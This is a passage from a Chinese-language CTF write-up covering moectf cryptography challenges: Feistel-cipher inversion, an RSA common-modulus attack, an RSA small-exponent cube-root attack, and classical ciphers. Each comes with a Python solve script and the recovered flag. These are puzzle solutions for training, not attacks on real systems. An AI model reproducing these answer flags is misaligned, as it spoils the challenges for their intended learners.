punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>l_list<span class=\"token operator\">=</span>l_list<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>l_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    flag<span class=\"token operator\">=</span>flag<span class=\"token operator\">+</span>l_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>backpack<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>FesitelTripple</strong></em></p>\n<blockquote>\n<p><s>有点像 DES，可惜不是，但是差不太多 emmm</s><br />\n<s> 其实没太看懂，瞎改了一通反正跑出来了（bushi</s><br />\nDES 里的加密和解密最后一轮是不会左右互换的，但是这里最后一轮还会互换，并且密钥依次用了 keysteam 里的 16 位<br />\n那么把 range 改成倒着来的，然后解密换成加密，加密换成解密就好了</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> keystream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>keystream<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    left <span class=\"token operator\">=</span> plaintext<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    right <span class=\"token operator\">=</span> plaintext<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>keystream<span class=\"token punctuation\">[</span>i <span class=\"token operator\">*</span> <span class=\"token number\">16</span><span class=\"token punctuation\">:</span>i <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        new_right <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> bytes_to_long<span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        new_left <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        left <span class=\"token operator\">=</span> new_left</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        right <span class=\"token operator\">=</span> new_right</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> left <span class=\"token operator\">+</span> right</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">,</span> keystream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>keystream<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    left <span class=\"token operator\">=</span> ciphertext<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    right <span class=\"token operator\">=</span> ciphertext<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>keystream<span class=\"token punctuation\">[</span>i <span class=\"token operator\">*</span> <span class=\"token number\">16</span><span class=\"token punctuation\">:</span>i <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        old_right <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        old_left <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>right<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> bytes_to_long<span class=\"token punctuation\">(</span>aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>old_right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        left <span class=\"token operator\">=</span> old_left</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        right <span class=\"token operator\">=</span> old_right</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">return</span> left <span class=\"token operator\">+</span> right</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>cipher<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">8465484536296110246056264738507061716988653458463168290845919961738127701895</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>key1 <span class=\"token operator\">=</span> <span class=\"token string\">b'it_is_just_the_first_time_key_and_encrypt_twice~'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>key2 <span class=\"token operator\">=</span> <span class=\"token string\">b'y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it'</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>cipher <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>cipher <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> key2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>flag <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> key1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#moectf&#123;th3_f3sit3l_1s_symmetric&#125;</span></pre></td></tr></table></figure><blockquote>\n<blockquote>\n<p><em><strong>NumberTheory-Powwwwwer</strong></em></p>\n<blockquote>\n<p>是 RSA 一种常见的攻击方式：共模攻击。<br />\n<s>其实是网上嫖的代码 QAQ</s></p>\n</blockquote>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">0x114514</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">11451401</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">136101507305579392638535644920761633964164170724862786826983346232384615490056114520867809528578619044234996682189743771790469301482774597055261893015794231752161620186891313083697906603842794202124169703689691049507643124840305144271549786654248958903748746153284903228556081709492696702282014035715848536699</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c1<span class=\"token operator\">=</span><span class=\"token number\">47220438825147485602004110821622560065904207675219860468929327492230243119464967323930295623259686691976072363819976125368307866223981062386682077438030452670319556977872343275419275297828846355087444641575933688543206152050119271402939885941719672725566836549228027040543887994457719131600949478670978241146</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c2<span class=\"token operator\">=</span><span class=\"token number\">115435415972673976853578931507112950322194896557724940548983105717498084920603530063295392396344585245149536619546139549595643165285610305977637286040529163780201012187105549728000887169595946039777889559399483628995380569296124138575774025562472143420878790970785857061634021973901034670780393435693955936244</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>_<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#moectf&#123;s0_Powwwwwwwwwwwww3r!&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>NumberTheory-MyGrandson</strong></em></p>\n<blockquote>\n<p>其实比较明显，c 比 n 小很多，而且 e=3，属于是取模取了个寂寞。<br />\n而且不敢确定的话可以把 c 列表打出来看看，每个元素其实都是一样的，也就是说 c 列表里实际上都是 m 的三次方。那么我们把 c 直接开三次方就可以了。<br />\n不过 pow 函数有精度问题，所以用 gmpy2.iroot 开一下。</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">25681920037857462308038008456804236725305902130578298860433144085656782676411434281544156794249690534545397408244321828543334304937398521739382233631303709676426573143503446051379370337969083171791612381925477</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#输出：(mpz (2950365559902224967742067902659102097834402066133060751891986702825853), True)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token number\">2950365559902224967742067902659102097834402066133060751891986702825853</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#moectf&#123;Chinese_Remain_Theory&#125;</span></pre></td></tr></table></figure><h1 id=\"classical-cryptography\"><a class=\"anchor\" href=\"#classical-cryptography\">#</a> Classical Cryptography</h1>\n<blockquote e3sy_Au9u5t1ne!=\"\">\n<p><em><strong>Augustine's Way</strong></em></p>\n<blockquote>\n<p>npfdug{f3tz_Bv9v5u1of!}<br />\n 就是凯撒，直接爆破。<br />\nmoectf</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><em><strong>OldButPopular</strong></em></p>\n<blockquote>\n<p>凯撒＋栅栏，先凯撒，找首字母是 m 的，就是要找的字符串。<br />\n然后用在线网站解不太对，看一下长度发现是 38，数一下 moectf 这几个字符的索引，发现分栏的方式应该是 8 8 8 7 7，跟标准的栅栏密码稍微差那么一点 <s>，不然真成白给题了。</s></p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">\"mf3n_u31o&#123;rtg7_dec__0_w&#125;c4wt_t0t540ohr\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a1<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a2<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a3<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a4<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a5<span class=\"token operator\">=</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a3<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">&lt;</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a5<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>moectf<span class=\"token punctuation\">&#123;</span>c453r_w4nt_t0_g0_ou7_th3_w0r1d<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>Augustine's Way#2</strong></em></p>\n<blockquote>\n<p>凯撒变式，用 ASCII 码表做位移，不局限于字母了，所有字符都要位移。</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cyber<span class=\"token operator\">=</span><span class=\"token string\">\"eg][l^sdm(i)YfWqq\\-u\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> cyber<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'m'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#moectf&#123;lu0q1an_yyd5&#125;</span></pre></td></tr></table></figure><blockquote the_key_of_vigenere_is_rxyyds=\"\">\n<p><em><strong>Ez Vigenere</strong></em></p>\n<blockquote>\n<p>搜一下维吉尼亚，前几个字符对照 moectf，可以知道密钥是 rxyyds，拿去解密网站解密就好了<br />\n moectf</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><em><strong>モンスターを縫う！</strong></em></p>\n<blockquote>\n<p>flag1，一眼凯撒，1 位移：   <strong>moectf{cl@</strong><br />\nflag2，维吉尼亚，密钥给了：  <strong>ssical</strong><br />\nflag3，栅栏，密钥 2：  <strong>_cipher</strong><br />\nflag4，ABAAA，培根密码：  <strong>I</strong><br />\nflag4，凯撒，13 位移 <s>（我当时忽略那个 B 了，没想明白是啥意思，后来他们告诉我 B 拆开就是 13・・・・・・）</s> ：<strong>pr3t</strong><br />\nflag5，摩斯密码： <strong>tyg00d!｝</strong><br />\n<strong>moectf{cl@ssical_cipherIpr3tyg00d!}</strong></p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><em><strong>Ex Viginere?</strong></em></p>\n<blockquote>\n<p><s>重头戏终于来了</s><br />\n这个解密的详细过程在 dbt 的博客里有，我们只需要把他进行 AES 解密和 base64 解密的那一段删掉，然后就可以跑出来明文了。之后根据哈希值逐位爆破，找到 flag。<br />\n简单来讲就是根据重合指数爆破出密钥长度，计算 k1 和 k2，就可以还原明文。在足够长的英文文本中，每个字母出现的频率有一个确定的值，重合指数就是根据这一统计规律来计算的。<br />\n<s>可以去看看 dbt 的博客，讲得可详细了～</s></p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'c.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 我们已经知道，维吉尼亚密码可以被分解为若干组平移密码来破译，</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 而一个明文足够长的平移密码的重合指数接近 0.0687。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 换言之，如果我们选取某个 l 值，使得分组后的密文的重合指数接近 0.065，</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 则说明选取的 t 值与密钥的长度是一致的。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>best_index <span class=\"token operator\">=</span> <span class=\"token 